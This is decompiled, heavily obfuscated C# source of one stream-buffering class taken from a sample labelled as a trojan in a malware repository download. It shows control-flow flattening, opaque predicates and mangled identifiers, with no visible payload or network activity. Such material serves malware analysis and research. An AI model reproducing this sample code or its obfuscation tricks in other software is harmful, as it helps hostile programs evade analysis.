// Decompiled with JetBrains decompiler
// Type: @Ձ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using sfEQeQAzPkGgSGbaUci;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using uvnKfWl33fmUHL1Rs4b;

internal sealed class \u0040Ձ : Stream
{
  private static readonly int \u0040ӓ;
  internal static readonly int \u0040Ӕ;
  internal List<\u0040Հ> \u0040ӕ;
  internal bool \u0040Ӗ;
  internal bool \u0040ӗ;
  internal object \u0040Ә;
  internal int \u0040ә;
  internal int \u0040Ӛ;
  internal object \u0040ӛ;
  private object \u0040Ӝ;
  internal bool \u0040ӝ;
  private bool \u0040Ӟ;
  internal int \u0040ӟ;
  internal int \u0040Ӡ;
  internal int \u0040ӡ;
  internal int \u0040Ӣ;
  internal int \u0040ӣ;
  internal object \u0040Ӥ;
  private object \u0040ӥ;
  internal Queue<int> \u0040Ӧ;
  internal Queue<int> \u0040ӧ;
  internal long \u0040Ө;
  internal I6IRgTAB68kRKW00LfL \u0040ө;
  internal object \u0040Ӫ;
  internal bool \u0040ӫ;
  private object \u0040Ӭ;
  private \u0040Ձ.\u0040ӓ \u0040ӭ;
  private NZtib2lYsa4jCXWXv5M \u0040Ӯ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ձ(
    Stream _param1,
    I6IRgTAB68kRKW00LfL _param2,
    NZtib2lYsa4jCXWXv5M _param3,
    bool _param4)
  {
    int num1 = 5;
    if (true)
      goto label_8;
label_2:
    this.\u0040Ӝ = new object();
    num1 = 8;
label_8:
    while (true)
    {
      switch (num1)
      {
        case 0:
          \u0040ԝ.\u0040ֶ(this, 16);
          num1 = 14;
          continue;
        case 1:
          this.\u0040Ӗ = _param4;
          num1 = 0;
          continue;
        case 2:
          this.\u0040ө = _param2;
          goto case 9;
        case 3:
        case 7:
          this.\u0040Ә = (object) _param1;
          num1 = 2;
          continue;
        case 4:
          this.\u0040Ӛ = \u0040Ձ.\u0040ӓ;
          if (true)
          {
            num1 = 12;
            continue;
          }
          goto case 8;
        case 5:
          \u0040Ձ.\u0040Ӵ();
          num1 = 4;
          continue;
        case 6:
          this.\u0040Ӭ = new object();
          num1 = 13;
          continue;
        case 8:
          this.\u0040ӥ = new object();
          int num2 = 6;
          num1 = \u0040Ձ.\u0040ӷ() ? num2 : num2;
          continue;
        case 9:
        case 11:
          this.\u0040Ӱ(_param3);
          num1 = 1;
          continue;
        case 10:
          \u0040Ձ.\u0040ӵ((object) this);
          break;
        case 12:
          goto label_2;
        case 13:
          this.\u0040ӭ = (\u0040Ձ.\u0040ӓ) 26942;
          if (true)
          {
            num1 = 10;
            continue;
          }
          goto case 10;
        case 14:
          goto label_17;
      }
      if (!\u0040Ձ.\u0040Ӷ())
      {
        int num3 = 11;
        num1 = \u0040Ձ.\u0040ӷ() ? num3 : num3;
      }
      else
      {
        int num4 = 3;
        num1 = \u0040Ձ.\u0040ӷ() ? num4 : num4;
      }
    }
label_17:;
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public NZtib2lYsa4jCXWXv5M \u0040ӯ() => this.\u0040Ӯ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0040Ӱ(NZtib2lYsa4jCXWXv5M _param1) => this.\u0040Ӯ = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.Sg5(byte[] _param1, int _param2, int _param3)
  {
    int num1 = 6;
    while (true)
    {
      int num2;
      int index;
      \u0040Հ հ;
      bool flag;
      int num3;
      switch (num1)
      {
        case 0:
          \u0040Ձ.\u0040ӹ((object) _param1, _param2, հ.\u0040ӓ, հ.\u0040Ә, num2);
          num1 = 26;
          continue;
        case 1:
          if (!this.\u0040ӝ)
          {
            if (this.\u0040Ӫ != null)
            {
              num1 = !\u0040Ձ.\u0040Ӷ() ? 20 : 17;
              continue;
            }
            if (_param3 == 0)
            {
              num1 = 8;
              continue;
            }
            if (!this.\u0040Ӟ)
            {
              num1 = 2;
              continue;
            }
            goto case 13;
          }
          else
          {
            num1 = 15;
            continue;
          }
        case 2:
          \u0040ԝ.\u0040Ӭ(this);
          num1 = 10;
          continue;
        case 3:
        case 17:
          this.\u0040ӫ = true;
          num1 = 21;
          continue;
        case 4:
          if (հ.\u0040Ә != հ.\u0040ӓ.Length)
          {
            this.\u0040ӟ = index;
            num1 = 23;
            continue;
          }
          num1 = 16;
          continue;
        case 5:
        case 29:
          if (_param3 <= 0)
          {
            num1 = 32;
            continue;
          }
          goto case 13;
        case 6:
          flag = false;
          num1 = 1;
          continue;
        case 7:
          հ.\u0040Ә += num2;
          num1 = 4;
          continue;
        case 8:
          goto label_37;
        case 9:
          index = -1;
          num1 = 12;
          continue;
        case 10:
          this.\u0040Ӟ = true;
          if (\u0040Ձ.\u0040Ӷ())
          {
            num1 = 13;
            continue;
          }
          goto label_42;
        case 11:
          _param2 += num2;
          num1 = 7;
          continue;
        case 12:
          if (this.\u0040ӟ < 0)
          {
            if (\u0040Ձ.\u0040Ӹ((object) this.\u0040ӧ) != 0)
            {
              index = this.\u0040ӧ.Dequeue();
              goto case 22;
            }
            else
              goto case 14;
          }
          else
          {
            num1 = 31;
            continue;
          }
        case 13:
          \u0040ԝ.\u0040ܖ(this, false, flag);
          num1 = 28;
          continue;
        case 14:
        case 20:
          flag = true;
          if (true)
          {
            num1 = 5;
            continue;
          }
          goto case 23;
        case 15:
          goto label_1;
        case 16:
          if (!\u0040Ձ.\u0040Ӻ((object) new WaitCallback(this.\u0040ӳ), (object) հ))
          {
            num1 = 30;
            continue;
          }
          this.\u0040ӟ = -1;
          num1 = 27;
          continue;
        case 18:
        case 19:
          հ = this.\u0040ӕ[index];
          num1 = 25;
          continue;
        case 21:
          goto label_42;
        case 22:
          ++this.\u0040Ӡ;
          num1 = 19;
          continue;
        case 23:
        case 27:
          num1 = 29;
          continue;
        case 24:
          num3 = հ.\u0040ӓ.Length - հ.\u0040Ә;
          break;
        case 25:
          if (հ.\u0040ӓ.Length - հ.\u0040Ә > _param3)
          {
            num3 = _param3;
            break;
          }
          num1 = 24;
          continue;
        case 26:
          _param3 -= num2;
          num1 = 11;
          continue;
        case 28:
          flag = false;
          num1 = 9;
          continue;
        case 30:
          goto label_13;
        case 31:
          index = this.\u0040ӟ;
          if (!\u0040Ձ.\u0040ӷ())
          {
            num1 = 18;
            continue;
          }
          goto case 18;
        case 32:
          goto label_45;
        default:
          num1 = 22;
          continue;
      }
      num2 = num3;
      հ.\u0040ӗ = this.\u0040Ӡ;
      num1 = 0;
    }
label_1:
    throw new InvalidOperationException();
label_13:
    throw new Exception((string) \u0040Ձ.\u0040ӻ(591744));
label_37:
    return;
label_45:
    return;
label_42:
    object ӫ = this.\u0040Ӫ;
    this.\u0040Ӫ = (object) null;
    throw ӫ;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.\u0038s3()
  {
    int num = 4;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_4;
        case 1:
        case 5:
          this.\u0040ӫ = true;
          if (true)
          {
            num = 2;
            continue;
          }
          goto label_7;
        case 2:
          goto label_1;
        case 3:
          goto label_14;
        case 4:
          if (this.\u0040Ӫ == null)
          {
            if (!this.\u0040ӫ)
            {
              \u0040ԝ.\u0040݂(this, false);
              num = 6;
              continue;
            }
            goto label_16;
          }
          else if (\u0040Ձ.\u0040ӷ())
          {
            if (true)
            {
              num = 0;
              continue;
            }
            goto case 1;
          }
          else
          {
            num = 5;
            continue;
          }
        case 6:
          goto label_8;
        default:
          goto label_15;
      }
    }
label_1:
    object ӫ = this.\u0040Ӫ;
    this.\u0040Ӫ = (object) null;
    throw ӫ;
label_16:
    return;
label_4:
    return;
label_14:
    return;
label_8:
    return;
label_15:
    return;
label_7:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.S4w() => \u0040ԝ.\u0040ػ(this);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0040ӱ()
  {
    this.\u0040ӕ = (List<\u0040Հ>) null;
    \u0040Ձ.\u0040Ӽ((object) this, true);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.aUP(bool _param1)
  {
    \u0040Ձ.\u0040ӽ((object) this, _param1);
    \u0040ԝ.\u0040ػ(this);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0040Ӳ(Stream _param1)
  {
    int num1 = 4;
    while (true)
    {
      List<\u0040Հ>.Enumerator enumerator;
      switch (num1)
      {
        case 0:
        case 7:
          this.\u0040ӝ = false;
          num1 = 11;
          continue;
        case 1:
          this.\u0040Ө = 0L;
          if (!\u0040Ձ.\u0040ӷ())
          {
            num1 = 14;
            continue;
          }
          goto label_27;
        case 2:
        case 9:
          this.\u0040Ӡ = -1;
          num1 = 13;
          continue;
        case 3:
          goto label_21;
        case 4:
          if (this.\u0040Ӟ)
          {
            \u0040Ձ.\u0040Ӿ((object) this.\u0040Ӧ);
            num1 = 5;
            continue;
          }
          num1 = 3;
          continue;
        case 5:
          \u0040Ձ.\u0040Ӿ((object) this.\u0040ӧ);
          num1 = 10;
          continue;
        case 6:
          this.\u0040Ӣ = -1;
          num1 = 8;
          continue;
        case 8:
          this.\u0040Ә = (object) _param1;
          num1 = 15;
          continue;
        case 10:
          enumerator = this.\u0040ӕ.GetEnumerator();
          num1 = 12;
          continue;
        case 11:
          this.\u0040ӟ = -1;
          goto case 2;
        case 12:
          try
          {
label_14:
            while (enumerator.MoveNext())
            {
              \u0040Հ current = enumerator.Current;
              int num2 = !\u0040Ձ.\u0040Ӷ() ? 3 : 2;
              while (true)
              {
                switch (num2)
                {
                  case 0:
                  case 2:
                    this.\u0040ӧ.Enqueue(current.\u0040Ӗ);
                    break;
                  case 4:
                    goto label_14;
                }
                current.\u0040ӗ = -1;
                num2 = 4;
              }
            }
          }
          finally
          {
            enumerator.Dispose();
          }
          this.\u0040Ӟ = false;
          if (true)
          {
            num1 = 1;
            continue;
          }
          goto case 4;
        case 13:
          this.\u0040ӡ = -1;
          num1 = 6;
          continue;
        case 14:
          this.\u0040Ӥ = (object) new \u0040Պ();
          break;
        case 15:
          goto label_6;
      }
      \u0040Ձ.\u0040ӷ();
      num1 = !\u0040Ձ.\u0040Ӷ() ? 2 : 0;
    }
label_21:
    return;
label_6:
    return;
label_27:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal void \u0040ӳ(object _param1)
  {
    \u0040Հ հ = (\u0040Հ) _param1;
    try
    {
      int ӗ = հ.\u0040Ӗ;
      \u0040Պ պ = new \u0040Պ();
      \u0040ԝ.\u0040ڊ(պ, (byte[]) հ.\u0040ӓ, 0, հ.\u0040Ә);
      \u0040ԝ.\u0040۪(this, հ);
      հ.\u0040ӕ = ~(int) պ.\u0040ӗ;
      object ӥ = this.\u0040ӥ;
      bool lockTaken1 = false;
      try
      {
        Monitor.Enter(ӥ, ref lockTaken1);
        switch (!\u0040Ձ.\u0040Ӷ() ? 3 : 2)
        {
          case 0:
          case 2:
            if (հ.\u0040ӗ <= this.\u0040Ӣ)
              goto label_8;
            else
              break;
        }
        this.\u0040Ӣ = հ.\u0040ӗ;
      }
      finally
      {
        if (lockTaken1)
          \u0040Ձ.\u0040ӿ(ӥ);
      }
label_8:
      Queue<int> ӧ = this.\u0040Ӧ;
      bool lockTaken2 = false;
      try
      {
        Monitor.Enter((object) ӧ, ref lockTaken2);
        this.\u0040Ӧ.Enqueue(հ.\u0040Ӗ);
      }
      finally
      {
        if (lockTaken2)
          \u0040Ձ.\u0040ӿ((object) ӧ);
      }
      \u0040Ձ.\u0040Ԁ(this.\u0040ӛ);
    }
    catch (Exception ex)
    {
      object ӭ = this.\u0040Ӭ;
      bool lockTaken = false;
      try
      {
        Monitor.Enter(ӭ, ref lockTaken);
        \u0040Ձ.\u0040Ӷ();
        switch (\u0040Ձ.\u0040ӷ() ? 3 : 2)
        {
          case 0:
          case 2:
            if (this.\u0040Ӫ == null)
              return;
            break;
        }
        this.\u0040Ӫ = (object) ex;
      }
      finally
      {
        if (lockTaken)
          \u0040Ձ.\u0040ӿ(ӭ);
      }
    }
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.\u003696() => false;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.\u0036I5() => false;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.L7K() => \u0040Ձ.\u0040ԁ(this.\u0040Ә);

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.D26() => throw new NotSupportedException();

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.\u003477() => \u0040Ձ.\u0040Ԃ(this.\u0040Ә);

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.\u00339g(long _param1) => throw new NotSupportedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  int Stream.\u0035iE(byte[] _param1, int _param2, int _param3) => throw new NotSupportedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.\u0035z5(long _param1, SeekOrigin _param2) => throw new NotSupportedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.s41(long _param1) => throw new NotSupportedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0040Ձ()
  {
    int num;
    if (\u0040Ձ.\u0040Ӷ())
    {
      if (true)
      {
        num = 2;
        goto label_6;
      }
    }
    else
      goto label_4;
label_2:
    \u0040Ձ.\u0040Ӵ();
    goto label_5;
label_4:
    num = 3;
    goto label_6;
label_5:
    \u0040Ձ.\u0040ӓ = 65536;
    goto label_8;
label_6:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          goto label_2;
        case 1:
        case 3:
          goto label_5;
        case 4:
          goto label_8;
        case 5:
          goto label_3;
        default:
          num = 4;
          continue;
      }
    }
label_3:
    return;
label_8:
    \u0040Ձ.\u0040Ӕ = 4;
    if (false)
      return;
    num = 5;
    goto label_6;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӵ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӵ(object _param0) => ((Stream) _param0).\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӷ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӷ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӹ(object _param0) => ((Queue<int>) _param0).Count;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӹ(
    object _param0,
    int _param1,
    object _param2,
    int _param3,
    int _param4)
  {
    Buffer.BlockCopy((Array) _param0, _param1, (Array) _param2, _param3, _param4);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӻ(object _param0, object _param1) => ThreadPool.QueueUserWorkItem((WaitCallback) _param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӻ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӽ(object _param0, bool _param1) => ((Stream) _param0).Dispose(_param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӽ(object _param0, bool _param1) => __nonvirtual (((Stream) _param0).Dispose(_param1));

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӿ(object _param0) => ((Queue<int>) _param0).Clear();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӿ(object _param0) => Monitor.Exit(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ԁ(object _param0) => ((EventWaitHandle) _param0).Set();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ԁ(object _param0) => ((Stream) _param0).CanWrite;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static long \u0040Ԃ(object _param0) => ((Stream) _param0).Position;

  [System.Flags]
  private enum \u0040ӓ : uint
  {
  }
}
